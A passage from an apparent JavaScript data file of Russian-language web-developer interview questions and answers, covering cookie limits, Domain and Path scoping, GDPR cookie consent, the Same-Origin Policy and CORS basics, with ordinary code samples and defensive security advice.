Domain=api.example.com\n\n// cdn.example.com - кэш данные  \nSet-Cookie: cacheKey=abc; Domain=cdn.example.com\n\n// auth.example.com - аутентификация\nSet-Cookie: session=123; Domain=auth.example.com</code></pre><p><strong>6. Использование Path для изоляции:</strong></p><pre><code>// Разные части приложения - разные пути\nSet-Cookie: adminData=xyz; Path=/admin\nSet-Cookie: shopData=abc; Path=/shop\nSet-Cookie: blogData=def; Path=/blog\n\n// Каждый раздел видит только свои cookies</code></pre><p><strong>7. Серверное хранение с ID:</strong></p><pre><code>// Клиент\ndocument.cookie = \"sessionId=abc123\"; // Всего ~20 байт\n\n// Сервер хранит все данные\nconst sessionData = {\n  userId: 123,\n  preferences: {...},\n  cart: [...],\n  history: [...]\n};\nredis.set('session:abc123', JSON.stringify(sessionData));</code></pre><p><strong>Best practices для управления cookies:</strong></p><ul><li>✅ Храните минимум данных в cookies</li><li>✅ Используйте короткие имена (user вместо currentUserIdentifier)</li><li>✅ Сжимайте данные если нужно хранить много</li><li>✅ Удаляйте cookies после использования</li><li>✅ Мониторьте количество и размер cookies</li><li>✅ Используйте localStorage для больших данных</li><li>✅ Храните на сервере, в cookies только ID</li><li>❌ Не дублируйте данные в разных cookies</li><li>❌ Не храните большие объекты</li><li>❌ Не создавайте десятки cookies для аналитики</li></ul><p><strong>Мониторинг и алерты:</strong></p><pre><code>// Проверка перед установкой критичной cookie\nfunction setImportantCookie(name, value) {\n  const stats = getCookieStats();\n  \n  if (stats.count >= 150) {\n    console.warn('Cookie limit approaching! Cleaning up...');\n    cleanupOldCookies();\n  }\n  \n  const size = new Blob([`${name}=${value}`]).size;\n  if (size > 4000) {\n    console.error('Cookie too large!', size);\n    // Сжать или использовать localStorage\n    localStorage.setItem(name, value);\n    return;\n  }\n  \n  document.cookie = `${name}=${value}; path=/`;\n}</code></pre><p><strong>Альтернативные решения:</strong></p><table><tr><th>Хранилище</th><th>Размер</th><th>Использование</th></tr><tr><td>Cookies</td><td>4KB × ~180</td><td>Auth, небольшие данные</td></tr><tr><td>localStorage</td><td>5-10MB</td><td>Настройки, кэш</td></tr><tr><td>sessionStorage</td><td>5-10MB</td><td>Временные данные</td></tr><tr><td>IndexedDB</td><td>~50MB-500MB</td><td>Большие данные, offline</td></tr><tr><td>Cache API</td><td>Зависит от диска</td><td>Кэш ресурсов</td></tr></table>",
    difficulty: 'middle',
    tags: ['cookie', 'лимиты', 'ограничения', 'размер', 'оптимизация']
  },
  {
    id: 28,
    question: "Как работают cookies с доменами и поддоменами? Что такое domain scope?",
    answer: "<p><strong>Domain scope cookies</strong> определяет, для каких доменов и поддоменов будет доступна cookie.</p><p><strong>Базовое поведение:</strong></p><p><strong>1. Без атрибута Domain (по умолчанию):</strong></p><ul><li>Cookie доступна только для точного домена, который её установил</li><li>Не доступна для поддоменов</li><li>Самый строгий вариант</li></ul><pre><code>// На домене app.example.com устанавливаем:\nSet-Cookie: sessionId=abc123\n// Без атрибута Domain\n\n// ✅ Доступна на: app.example.com\n// ❌ НЕ доступна на: api.app.example.com (поддомен)\n// ❌ НЕ доступна на: example.com (родительский домен)\n// ❌ НЕ доступна на: other.example.com (другой поддомен)</code></pre><p><strong>2. С атрибутом Domain:</strong></p><ul><li>Cookie доступна для указанного домена И всех его поддоменов</li><li>Нельзя установить для родительского домена выше</li><li>Нельзя установить для другого домена</li></ul><pre><code>// На домене app.example.com устанавливаем:\nSet-Cookie: userId=123; Domain=example.com\n\n// ✅ Доступна на: example.com\n// ✅ Доступна на: app.example.com\n// ✅ Доступна на: api.example.com\n// ✅ Доступна на: shop.example.com\n// ✅ Доступна на: api.shop.example.com (вложенный поддомен)\n// ❌ НЕ доступна на: example.org (другой домен)</code></pre><p><strong>Правила установки Domain:</strong></p><p><strong>1. Можно установить только для своего домена или предка:</strong></p><pre><code>// На app.example.com:\n\n// ✅ Можно:\nSet-Cookie: a=1; Domain=app.example.com\nSet-Cookie: b=2; Domain=example.com\n\n// ❌ НЕЛЬЗЯ:\nSet-Cookie: c=3; Domain=other.com // Чужой домен\nSet-Cookie: d=4; Domain=com // Top-level домен</code></pre><p><strong>2. Точка в начале Domain игнорируется:</strong></p><pre><code>// Эти две записи идентичны:\nSet-Cookie: a=1; Domain=example.com\nSet-Cookie: b=2; Domain=.example.com // Точка игнорируется</code></pre><p><strong>Практические сценарии:</strong></p><p><strong>Сценарий 1: Изолированные поддомены</strong></p><pre><code>// Каждый поддомен имеет свои cookies\n\n// На api.example.com:\nSet-Cookie: apiToken=xyz\n// Только для api.example.com\n\n// На shop.example.com:\nSet-Cookie: cartId=abc\n// Только для shop.example.com\n\n// Поддомены не видят cookies друг друга</code></pre><p><strong>Сценарий 2: Shared authentication</strong></p><pre><code>// Общая аутентификация для всех поддоменов\n\n// На auth.example.com после логина:\nSet-Cookie: sessionId=abc123; \n  Domain=example.com; \n  Path=/; \n  Secure; \n  HttpOnly\n\n// Теперь пользователь авторизован на:\n// - example.com\n// - app.example.com  \n// - api.example.com\n// - любой поддомен example.com</code></pre><p><strong>Сценарий 3: API и фронтенд на разных поддоменах</strong></p><pre><code>// Фронтенд: app.example.com\n// API: api.example.com\n\n// API устанавливает cookie для обоих:\nSet-Cookie: authToken=xyz; \n  Domain=example.com; \n  SameSite=Lax; \n  Secure\n\n// Теперь fetch с app.example.com к api.example.com\n// будет включать cookie автоматически</code></pre><p><strong>Чтение cookies с учетом Domain:</strong></p><pre><code>// document.cookie показывает ВСЕ доступные cookies\n// Включая установленные родительским доменом\n\n// На поддомене app.example.com:\nconsole.log(document.cookie);\n// Показывает:\n// - cookies установленные на app.example.com\n// - cookies с Domain=example.com\n// - cookies без Domain на app.example.com</code></pre><p><strong>Конфликты имен cookies:</strong></p><pre><code>// Если есть две cookies с одинаковым именем:\n\n// Cookie 1: установлена на example.com\nSet-Cookie: userId=123; Domain=example.com\n\n// Cookie 2: установлена на app.example.com  \nSet-Cookie: userId=456\n\n// На app.example.com обе доступны!\n// Браузер отправит ОБЕ на сервер:\nCookie: userId=456; userId=123\n\n// Порядок: более специфичная (app.example.com) идет первой</code></pre><p><strong>Безопасность Domain scope:</strong></p><p><strong>Проблема широкого Domain:</strong></p><pre><code>// ❌ Опасно - слишком широкий scope\nSet-Cookie: sessionId=secret; Domain=example.com\n// Доступна на ВСЕХ поддоменах\n// Если на user-content.example.com есть XSS\n// злоумышленник может украсть sessionId\n\n// ✅ Безопаснее - узкий scope\nSet-Cookie: sessionId=secret\n// Только для текущего домена</code></pre><p><strong>Subdomain takeover риск:</strong></p><ul><li>Если старый поддомен (old.example.com) больше не используется</li><li>DNS запись может быть перехвачена</li><li>Злоумышленник может прочитать cookies с Domain=example.com</li><li>Важно удалять неиспользуемые DNS записи</li></ul><p><strong>Best practices для Domain:</strong></p><ul><li>✅ Не указывайте Domain без необходимости (более безопасно)</li><li>✅ Используйте Domain только для shared cookies (auth, preferences)</li><li>✅ Критичные cookies - без Domain атрибута</li><li>✅ Регулярно проверяйте используемые поддомены</li><li>❌ Не используйте широкий Domain для конфиденциальных данных</li><li>❌ Не устанавливайте cookies на неиспользуемых поддоменах</li></ul><p><strong>Отладка Domain issues:</strong></p><pre><code>// Проверить все cookies и их domain scope\nfunction debugCookies() {\n  // В DevTools: Application → Cookies\n  // Показывает Domain каждой cookie\n  \n  // Или программно (ограниченная информация):\n  console.log('All cookies:', document.cookie);\n  \n  // На сервере проверить какие cookies пришли:\n  console.log('Received cookies:', req.headers.cookie);\n}</code></pre>",
    difficulty: 'middle',
    tags: ['cookie', 'domain', 'поддомены', 'scope', 'безопасность']
  },
  {
    id: 29,
    question: "Как работает атрибут Path в cookies и для чего он используется?",
    answer: "<p><strong>Path атрибут</strong> определяет для каких URL путей на домене будет доступна cookie.</p><p><strong>Базовое поведение Path:</strong></p><pre><code>// Cookie с Path=/admin\nSet-Cookie: adminToken=xyz; Path=/admin\n\n// ✅ Отправляется для:\n// - /admin\n// - /admin/users\n// - /admin/settings/security\n\n// ❌ НЕ отправляется для:\n// - / (главная страница)\n// - /shop\n// - /api\n// - /administration (не начинается с /admin)</code></pre><p><strong>Правила совпадения Path:</strong></p><ul><li>Cookie отправляется если URL путь начинается с указанного Path</li><li>Path=/admin совпадает с /admin, /admin/, /admin/users</li><li>Path сравнивается с начала строки</li><li>Case-sensitive (регистр имеет значение)</li></ul><p><strong>Значения Path по умолчанию:</strong></p><pre><code>// Без указания Path - берется путь текущего URL\n\n// Запрос к https://example.com/shop/cart\nSet-Cookie: cartId=123\n// Path автоматически = /shop\n\n// Для Path=/ нужно явно указать:\nSet-Cookie: cartId=123; Path=/</code></pre><p><strong>Типичные сценарии использования:</strong></p><p><strong>1. Глобальные cookies (Path=/):</strong></p><pre><code>// Доступна для всего сайта\nSet-Cookie: sessionId=abc; Path=/; Secure; HttpOnly\nSet-Cookie: language=ru; Path=/\nSet-Cookie: theme=dark; Path=/\n\n// Используется для:\n// - Аутентификации\n// - Общих настроек\n// - Данных, нужных везде</code></pre><p><strong>2. Изоляция разделов сайта:</strong></p><pre><code>// Админ панель\nSet-Cookie: adminSession=xyz; Path=/admin; Secure; HttpOnly\n\n// API\nSet-Cookie: apiKey=abc; Path=/api\n\n// Магазин\nSet-Cookie: cartId=123; Path=/shop\n\n// Каждый раздел изолирован от других</code></pre><p><strong>3. Версионирование API:</strong></p><pre><code>// Разные токены для разных версий API\nSet-Cookie: token=v1_abc; Path=/api/v1\nSet-Cookie: token=v2_xyz; Path=/api/v2\n\n// Запросы к /api/v1 получат v1_abc\n// Запросы к /api/v2 получат v2_xyz</code></pre><p><strong>Взаимодействие Path и Domain:</strong></p><pre><code>// Комбинация Domain и Path\nSet-Cookie: data=value; \n  Domain=example.com; \n  Path=/api\n\n// ✅ Отправляется для:\n// - https://example.com/api\n// - https://api.example.com/api/users\n// - https://shop.example.com/api/products\n\n// ❌ НЕ отправляется для:\n// - https://example.com/ (неверный path)\n// - https://example.com/shop (неверный path)\n// - https://other.com/api (неверный domain)</code></pre><p><strong>Конфликты и приоритет:</strong></p><pre><code>// Две cookies с одинаковым именем, разными Path:\nSet-Cookie: token=general; Path=/\nSet-Cookie: token=specific; Path=/admin\n\n// Запрос к /admin/users\n// Браузер отправит ОБЕ:\nCookie: token=specific; token=general\n\n// Порядок: более специфичный Path идет первым\n// Сервер должен обработать правильную</code></pre><p><strong>Безопасность и Path:</strong></p><p><strong>⚠️ Path НЕ является security boundary:</strong></p><ul><li>JavaScript может читать cookies с любым Path (если не HttpOnly)</li><li>Path не защищает от XSS на том же домене</li><li>Используйте для организации, не для безопасности</li></ul><pre><code>// На странице /shop можно прочитать:\ndocument.cookie; \n// Включает cookies с Path=/admin если нет HttpOnly!\n\n// Защита - только HttpOnly:\nSet-Cookie: adminToken=xyz; Path=/admin; HttpOnly</code></pre><p><strong>Удаление cookies с учетом Path:</strong></p><pre><code>// Для удаления нужно указать ТОТ ЖЕ Path\n\n// Установка:\nSet-Cookie: data=value; Path=/admin\n\n// ❌ НЕ удалит:\nSet-Cookie: data=; expires=Thu, 01 Jan 1970 00:00:00 UTC; Path=/\n\n// ✅ Удалит:\nSet-Cookie: data=; expires=Thu, 01 Jan 1970 00:00:00 UTC; Path=/admin</code></pre><p><strong>JavaScript управление с Path:</strong></p><pre><code>// Установка с Path\nfunction setCookie(name, value, path = '/') {\n  document.cookie = `${name}=${value}; path=${path}`;\n}\n\nsetCookie('userId', '123', '/api');\n\n// Удаление с Path\nfunction deleteCookie(name, path = '/') {\n  document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=${path}`;\n}\n\ndeleteCookie('userId', '/api');</code></pre><p><strong>Практический пример - Микрофронтенды:</strong></p><pre><code>// Разные приложения на разных путях\n\n// Dashboard app на /dashboard\nSet-Cookie: dashboardState=xyz; Path=/dashboard\n\n// Shop app на /shop  \nSet-Cookie: cartData=abc; Path=/shop\n\n// Admin app на /admin\nSet-Cookie: adminPrefs=def; Path=/admin\n\n// Глобальная auth cookie\nSet-Cookie: sessionId=123; Path=/; HttpOnly; Secure\n\n// Каждое приложение изолировано, но все авторизованы</code></pre><p><strong>Отладка Path issues:</strong></p><pre><code>// Проверить какие cookies доступны для текущего пути\nfunction debugPathCookies() {\n  console.log('Current path:', window.location.pathname);\n  console.log('Available cookies:', document.cookie);\n  \n  // В DevTools: Application → Cookies\n  // Колонка Path показывает scope каждой cookie\n}</code></pre><p><strong>Best practices для Path:</strong></p><ul><li>✅ Используйте Path=/ для общих cookies (auth, settings)</li><li>✅ Используйте специфичный Path для изоляции разделов</li><li>✅ Всегда указывайте Path явно для предсказуемости</li><li>✅ Помните Path при удалении cookies</li><li>❌ Не полагайтесь на Path для security изоляции</li><li>❌ Не создавайте много cookies с разными Path без необходимости</li></ul>",
    difficulty: 'middle',
    tags: ['cookie', 'Path', 'URL', 'scope', 'изоляция']
  },
  {
    id: 30,
    question: "Как cookies связаны с GDPR и другими законами о приватности? Что нужно знать разработчику?",
    answer: "<p><strong>GDPR (General Data Protection Regulation)</strong> и другие законы о приватности устанавливают строгие требования к использованию cookies и обработке персональных данных.</p><p><strong>Основные законы о приватности:</strong></p><ul><li><strong>GDPR</strong> — Европейский союз (2018)</li><li><strong>ePrivacy Directive</strong> — EU Cookie Law</li><li><strong>CCPA/CPRA</strong> — Калифорния, США</li><li><strong>LGPD</strong> — Бразилия</li><li><strong>PIPEDA</strong> — Канада</li></ul><p><strong>Ключевые требования GDPR к cookies:</strong></p><p><strong>1. Согласие пользователя (Consent):</strong></p><ul><li>Нужно получить явное согласие ДО установки cookies</li><li>Согласие должно быть свободным, информированным и однозначным</li><li>Pre-checked чекбоксы запрещены</li><li>\"Продолжая использовать сайт\" — недостаточно</li><li>Пользователь может отозвать согласие в любой момент</li></ul><p><strong>2. Категории cookies по GDPR:</strong></p><p><strong>Strictly Necessary (Строго необходимые):</strong></p><ul><li>НЕ требуют согласия</li><li>Необходимы для функционирования сайта</li><li>Примеры: session cookies, корзина, безопасность</li></ul><pre><code>// Не требуют согласия:\nSet-Cookie: sessionId=abc; HttpOnly; Secure // Аутентификация\nSet-Cookie: cartId=xyz; Path=/shop // Корзина\nSet-Cookie: csrfToken=123 // Безопасность</code></pre><p><strong>Functional (Функциональные):</strong></p><ul><li>Требуют согласия</li><li>Улучшают пользовательский опыт</li><li>Примеры: язык, настройки, предпочтения</li></ul><pre><code>// Требуют согласия:\nSet-Cookie: language=ru // Язык интерфейса\nSet-Cookie: theme=dark // Тема оформления</code></pre><p><strong>Analytics (Аналитические):</strong></p><ul><li>Требуют согласия</li><li>Сбор статистики и аналитики</li><li>Примеры: Google Analytics, Яндекс.Метрика</li></ul><pre><code>// Требуют согласия:\nSet-Cookie: _ga=... // Google Analytics\nSet-Cookie: _ym_uid=... // Яндекс.Метрика</code></pre><p><strong>Marketing/Advertising (Маркетинговые):</strong></p><ul><li>Требуют согласия</li><li>Реклама, ретаргетинг, персонализация</li><li>Примеры: рекламные сети, трекеры</li></ul><pre><code>// Требуют согласия:\nSet-Cookie: _fbp=... // Facebook Pixel\nSet-Cookie: ads_id=... // Рекламные ID</code></pre><p><strong>Реализация Cookie Consent:</strong></p><p><strong>1. Cookie Banner (базовая реализация):</strong></p><pre><code>// HTML структура\n<div id=\"cookie-banner\" class=\"cookie-banner\">\n  <p>Мы используем cookies для улучшения работы сайта.</p>\n  <button id=\"accept-all\">Принять все</button>\n  <button id=\"reject-all\">Отклонить</button>\n  <button id=\"customize\">Настроить</button>\n</div>\n\n// JavaScript управление\nclass CookieConsent {\n  constructor() {\n    this.preferences = this.loadPreferences();\n    if (!this.preferences) {\n      this.showBanner();\n    } else {\n      this.applyPreferences();\n    }\n  }\n  \n  showBanner() {\n    document.getElementById('cookie-banner').style.display = 'block';\n    \n    document.getElementById('accept-all').onclick = () => {\n      this.savePreferences({\n        necessary: true,\n        functional: true,\n        analytics: true,\n        marketing: true\n      });\n      this.hideBanner();\n      this.loadScripts();\n    };\n    \n    document.getElementById('reject-all').onclick = () => {\n      this.savePreferences({\n        necessary: true,\n        functional: false,\n        analytics: false,\n        marketing: false\n      });\n      this.hideBanner();\n    };\n  }\n  \n  savePreferences(prefs) {\n    // Эта cookie не требует согласия (strictly necessary)\n    document.cookie = `cookie_consent=${JSON.stringify(prefs)}; max-age=31536000; path=/; SameSite=Lax`;\n  }\n  \n  loadPreferences() {\n    const match = document.cookie.match(/cookie_consent=([^;]+)/);\n    return match ? JSON.parse(match[1]) : null;\n  }\n  \n  applyPreferences() {\n    if (this.preferences.analytics) {\n      this.loadGoogleAnalytics();\n    }\n    if (this.preferences.marketing) {\n      this.loadMarketingScripts();\n    }\n  }\n  \n  loadGoogleAnalytics() {\n    // Загружать ТОЛЬКО после согласия\n    const script = document.createElement('script');\n    script.src = 'https://www.googletagmanager.com/gtag/js?id=GA_ID';\n    document.head.appendChild(script);\n  }\n}</code></pre><p><strong>2. Готовые решения:</strong></p><ul><li>Cookiebot</li><li>OneTrust</li><li>CookieYes</li><li>Osano</li></ul><p><strong>Права пользователей по GDPR:</strong></p><ul><li><strong>Право на доступ</strong> — узнать какие данные собираются</li><li><strong>Право на удаление</strong> — \"право быть забытым\"</li><li><strong>Право на портативность</strong> — экспорт данных</li><li><strong>Право на возражение</strong> — отказ от обработки</li><li><strong>Право отозвать согласие</strong> — в любой момент</li></ul><p><strong>Требования к Cookie Policy:</strong></p><ul><li>Понятное описание каких cookies используется</li><li>Для чего используется каждая cookie</li><li>Как долго хранятся cookies</li><li>Кто имеет доступ (third-party)</li><li>Как пользователь может управлять cookies</li></ul><p><strong>Штрафы за нарушения:</strong></p><ul><li>GDPR: до €20 млн или 4% годового оборота</li><li>CCPA: до $7,500 за нарушение</li><li>Репутационный ущерб</li></ul><p><strong>Best practices для разработчиков:</strong></p><ul><li>✅ Получайте согласие ДО установки не-necessary cookies</li><li>✅ Четко разделяйте категории cookies</li><li>✅ Предоставьте детальные настройки</li><li>✅ Реализуйте легкий способ отзыва согласия</li><li>✅ Документируйте все cookies в Cookie Policy</li><li>✅ Регулярно аудит используемых cookies</li><li>✅ Удаляйте cookies при отзыве согласия</li><li>✅ Используйте минимально необходимые данные</li><li>✅ Установите разумные сроки хранения</li><li>❌ Не блокируйте доступ к сайту без согласия (cookie walls спорны)</li><li>❌ Не используйте pre-checked чекбоксы</li><li>❌ Не прячьте опцию отклонения</li></ul><p><strong>Техническая реализация соответствия:</strong></p><pre><code>// Условная загрузка скриптов\nfunction loadScript(category) {\n  const consent = getConsent();\n  if (!consent[category]) {\n    console.log(`${category} cookies not consented`);\n    return;\n  }\n  // Загрузка разрешена\n}\n\n// Удаление cookies при отзыве\nfunction revokeConsent(category) {\n  // Удалить все cookies этой категории\n  const cookiesToDelete = getCookiesByCategory(category);\n  cookiesToDelete.forEach(name => {\n    deleteCookie(name);\n  });\n}</code></pre>",
    difficulty: 'middle',
    tags: ['GDPR', 'приватность', 'cookie consent', 'законы', 'compliance']
  },
  {
    id: 31,
    question: "Что такое Same-Origin Policy и почему она была введена?",
    answer: "<p><strong>Same-Origin Policy (SOP)</strong> — это фундаментальная концепция безопасности браузера, ограничивающая взаимодействие между ресурсами разных источников (origins).</p><p><strong>Что такое Origin (источник):</strong></p><ul><li>Origin состоит из трех компонентов: протокол + домен + порт</li><li>https://example.com:443 — это один origin</li><li>http://example.com:80 — другой origin (другой протокол)</li><li>https://api.example.com:443 — третий origin (другой поддомен)</li></ul><p><strong>Примеры Same-Origin и Cross-Origin:</strong></p><p>Базовый URL: https://example.com/page</p><ul><li>✅ Same-origin: https://example.com/other-page (тот же origin)</li><li>✅ Same-origin: https://example.com:443/api (порт 443 по умолчанию для HTTPS)</li><li>❌ Cross-origin: http://example.com/page (другой протокол)</li><li>❌ Cross-origin: https://example.com:8080/page (другой порт)</li><li>❌ Cross-origin: https://api.example.com/page (другой поддомен)</li><li>❌ Cross-origin: https://example.org/page (другой домен)</li></ul><p><strong>Зачем нужна Same-Origin Policy:</strong></p><p><strong>Без SOP возможны атаки:</strong></p><ul><li>Злонамеренный сайт evil.com может прочитать данные из bank.com</li><li>JavaScript с одного сайта может получить доступ к cookies другого</li><li>Можно украсть конфиденциальную информацию</li><li>Можно подделать действия от имени пользователя</li></ul><p><strong>Пример атаки без SOP:</strong></p><ul><li>Пользователь залогинен в bank.com</li><li>Открывает злонамеренный сайт evil.com</li><li>evil.com делает запрос к bank.com/api/account</li><li>Без SOP: получает данные счета и может их украсть</li><li>С SOP: браузер блокирует доступ к ответу</li></ul><p><strong>Что блокирует Same-Origin Policy:</strong></p><ul><li>Чтение ответов от cross-origin запросов (AJAX, fetch)</li><li>Доступ к DOM другого origin через JavaScript</li><li>Доступ к cookies другого origin</li><li>Доступ к localStorage/sessionStorage другого origin</li></ul><p><strong>Что НЕ блокирует SOP:</strong></p><ul><li>Загрузку изображений: &lt;img src=\"https://other.com/pic.jpg\"&gt;</li><li>Загрузку скриптов: &lt;script src=\"https://cdn.com/lib.js\"&gt;</li><li>Загрузку стилей: &lt;link href=\"https://cdn.com/style.css\"&gt;</li><li>Отправку форм: &lt;form action=\"https://other.com\"&gt;</li><li>Встраивание iframe (но без доступа к содержимому)</li></ul><p><strong>Проблема SOP для легитимных случаев:</strong></p><ul><li>Современные приложения часто используют микросервисы</li><li>API и фронтенд на разных доменах</li><li>Нужны cross-origin запросы для нормальной работы</li><li>SOP блокирует и легитимные сценарии</li></ul><p><strong>Решение — CORS:</strong></p><ul><li>CORS (Cross-Origin Resource Sharing) — механизм для разрешения cross-origin запросов</li><li>Сервер явно указывает, какие origins могут получить доступ</li><li>Браузер проверяет разрешения и разблокирует доступ</li><li>Баланс между безопасностью и функциональностью</li></ul>",
    difficulty: 'junior',
    tags: ['CORS', 'Same-Origin Policy', 'безопасность', 'основы']
  },
  {
    id: 32,
    question: "Что такое CORS и как он работает на базовом уровне?",
    answer: "<p><strong>CORS (Cross-Origin Resource Sharing)</strong> — это механизм, позволяющий браузеру безопасно делать запросы к ресурсам на другом домене с явного разрешения сервера.</p><p><strong>Базовый принцип работы:</strong></p><ol><li>Браузер отправляет запрос с заголовком Origin</li><li>Сервер проверяет Origin и решает разрешить или нет</li><li>Сервер добавляет CORS заголовки в ответ</li><li>Браузер проверяет заголовки и разрешает/блокирует доступ к ответу</li></ol><p><strong>Простейший CORS запрос:</strong></p><p>Клиент (https://app.example.com):</p><ul><li>Делает fetch запрос к https://api.other.com</li><li>Браузер автоматически добавляет: Origin: https://app.example.com</li></ul><p>Сервер (https://api.other.com):</p><ul><li>Получает запрос, видит Origin</li><li>Проверяет, разрешен ли этот Origin</li><li>Если да — добавляет: Access-Control-Allow-Origin: https://app.example.com</li><li>Если нет — не добавляет заголовок</li></ul><p>Браузер:</p><ul><li>Получает ответ</li><li>Проверяет наличие Access-Control-Allow-Origin</li><li>Если есть и совпадает — дает доступ к данным</li><li>Если нет — блокирует и выдает CORS error</li></ul><p><strong>Ключевые моменты:</strong></p><ul><li>Запрос всё равно отправляется на сервер (SOP не блокирует отправку)</li><li>Сервер обрабатывает запрос и возвращает ответ</li><li>Браузер блокирует доступ к ответу, если нет CORS заголовков</li><li>Серверу нужно явно разрешить cross-origin доступ</li></ul><p><strong>Минимальные CORS заголовки:</strong></p><p>Сервер должен вернуть:</p><ul><li>Access-Control-Allow-Origin: указывает разрешенные origins</li><li>Может быть конкретный домен или * (любой)</li></ul><p><strong>Зачем нужен CORS:</strong></p><ul><li>Разрешает легитимные cross-origin запросы</li><li>Сохраняет безопасность (сервер контролирует доступ)</li><li>Позволяет строить распределенные приложения</li><li>API на отдельном домене</li><li>CDN для ресурсов</li><li>Микросервисная архитектура</li></ul><p><strong>Важно понимать:</strong></p><ul><li>CORS работает только в браузере</li><li>Server-to-server запросы не ограничены CORS</li><li>CORS не заменяет аутентификацию</li><li>CORS не защищает API от злоумышленников (только браузер)</li><li>Нужны дополнительные меры безопасности на сервере</li></ul>",
    difficulty: 'junior',
    tags: ['CORS', 'основы', 'механизм', 'заголовки']
  },
  {
    id: 33,
    question: "Какие существуют типы CORS запросов: простые и preflight?",
    answer: "<p><strong>CORS запросы делятся на два типа:</strong> простые запросы (simple requests) и запросы с preflight проверкой.</p><p><strong>Простые запросы (Simple Requests):</strong></p><p>Отправляются сразу без предварительной проверки, если соблюдены ВСЕ условия:</p><p><strong>1. Разрешенные методы:</strong></p><ul><li>GET</li><li>POST</li><li>HEAD</li></ul><p><strong>2. Разрешенные заголовки:</strong></p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type (но только определенные значения)</li></ul><p><strong>3. Content-Type может быть только:</strong></p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul><p><strong>4. Дополнительные условия:</strong></p><ul><li>Нет event listeners на XMLHttpRequest.upload</li><li>Нет ReadableStream в запросе</li></ul><p><strong>Примеры простых запросов:</strong></p><ul><li>GET запрос без кастомных заголовков</li><li>POST с Content-Type: application/x-www-form-urlencoded</li><li>HEAD запрос</li></ul><p><strong>Как работает простой запрос:</strong></p><ol><li>Браузер отправляет запрос сразу с Origin</li><li>Сервер обрабатывает и возвращает ответ с CORS заголовками</li><li>Браузер проверяет заголовки и дает доступ</li><li>Только один HTTP запрос</li></ol><p><strong>Preflight запросы (Preflighted Requests):</strong></p><p>Требуют предварительную OPTIONS проверку, если:</p><ul><li>Используются методы кроме GET/POST/HEAD (PUT, DELETE, PATCH)</li><li>Кастомные заголовки (Authorization, X-Custom-Header)</li><li>Content-Type: application/json</li><li>Content-Type: application/xml</li><li>Любые другие нестандартные параметры</li></ul><p><strong>Примеры preflight запросов:</strong></p><ul><li>DELETE запрос</li><li>POST с Content-Type: application/json</li><li>Любой запрос с заголовком Authorization</li><li>PUT/PATCH запросы</li></ul><p><strong>Как работает preflight:</strong></p><ol><li><strong>Preflight запрос (OPTIONS):</strong><ul><li>Браузер автоматически отправляет OPTIONS</li><li>Указывает какой метод и заголовки будут использованы</li><li>Origin: откуда запрос</li><li>Access-Control-Request-Method: DELETE</li><li>Access-Control-Request-Headers: Authorization</li></ul></li><li><strong>Preflight ответ:</strong><ul><li>Сервер проверяет и отвечает разрешениями</li><li>Access-Control-Allow-Origin: https://app.com</li><li>Access-Control-Allow-Methods: GET, POST, DELETE</li><li>Access-Control-Allow-Headers: Authorization</li><li>Access-Control-Max-Age: 86400 (кэш на 24 часа)</li></ul></li><li><strong>Основной запрос:</strong><ul><li>Если preflight успешен — браузер отправляет основной запрос</li><li>Сервер обрабатывает и возвращает данные</li><li>Браузер проверяет CORS заголовки снова</li></ul></li></ol><p><strong>Зачем нужен preflight:</strong></p><ul><li>Защита старых серверов, не ожидающих новые методы</li><li>Предотвращение нежелательных побочных эффектов (DELETE без проверки)</li><li>Проверка разрешений до отправки потенциально опасного запроса</li><li>Серверу дается шанс отклонить запрос заранее</li></ul><p><strong>Оптимизация preflight:</strong></p><ul><li>Access-Control-Max-Age кэширует preflight ответ</li><li>Браузер не повторяет OPTIONS для одинаковых запросов</li><li>Уменьшает количество запросов</li><li>Но кэш ограничен (обычно до 24 часов)</li></ul><p><strong>Важные различия:</strong></p><table><tr><th>Аспект</th><th>Simple</th><th>Preflight</th></tr><tr><td>Методы</td><td>GET, POST, HEAD</td><td>PUT, DELETE, PATCH и др.</td></tr><tr><td>Заголовки</td><td>Только стандартные</td><td>Любые кастомные</td></tr><tr><td>Content-Type</td><td>form-data, text/plain</td><td>application/json и др.</td></tr><tr><td>Запросов</td><td>Один</td><td>Два (OPTIONS + основной)</td></tr><tr><td>Производительность</td><td>Быстрее</td><td>Медленнее из-за OPTIONS</td></tr></table>",
    difficulty: 'middle',
    tags: ['CORS', 'simple requests', 'preflight', 'OPTIONS']
  },
  {
    id: 34,
    question: "Какие основные CORS заголовки существуют и за что они отвечают?",
    answer: "<p><strong>CORS заголовки</strong> делятся на заголовки запроса (request) и заголовки ответа (response).</p><p><strong>Заголовки запроса (устанавливает браузер):</strong></p><p><strong>1. Origin:</strong></p><ul><li>Автоматически добавляется браузером</li><li>Указывает источник запроса</li><li>Формат: протокол://домен:порт</li><li>Пример: Origin: https://app.example.com</li><li>Нельзя изменить через JavaScript</li></ul><p><strong>2. Access-Control-Request-Method:</strong></p><ul><li>Только в preflight запросах</li><li>Указывает HTTP метод основного запроса</li><li>Пример: Access-Control-Request-Method: DELETE</li></ul><p><strong>3. Access-Control-Request-Headers:</strong></p><ul><li>Только в preflight запросах</li><li>Список кастомных заголовков, которые будут в основном запросе</li><li>Пример: Access-Control-Request-Headers: Authorization, X-Custom</li></ul><p><strong>Заголовки ответа (устанавливает сервер):</strong></p><p><strong>1. Access-Control-Allow-Origin (обязательный):</strong></p><ul><li>Указывает какие origins допустимы</li><li>Может быть конкретный origin или *</li><li>Пример: Access-Control-Allow-Origin: https://app.example.com</li><li>Или: Access-Control-Allow-Origin: *</li><li>Только одно значение (не список!)</li></ul><p><strong>Важно про *:</strong></p><ul><li>* разрешает любой origin</li><li>НО нельзя использовать * с credentials</li><li>Если нужны cookies — указывать конкретный origin</li></ul><p><strong>2. Access-Control-Allow-Methods:</strong></p><ul><li>Разрешенные HTTP методы</li><li>Только в preflight ответе</li><li>Пример: Access-Control-Allow-Methods: GET, POST, PUT, DELETE</li><li>Можно указать несколько через запятую</li></ul><p><strong>3. Access-Control-Allow-Headers:</strong></p><ul><li>Разрешенные кастомные заголовки</li><li>Только в preflight ответе</li><li>Пример: Access-Control-Allow-Headers: Authorization, Content-Type, X-Custom</li><li>Если клиент запрашивает заголовки, сервер должен их разрешить</li></ul><p><strong>4. Access-Control-Allow-Credentials:</strong></p><ul><li>Разрешает отправку cookies и Authorization</li><li>Значение: true или не указывать вообще</li><li>Пример: 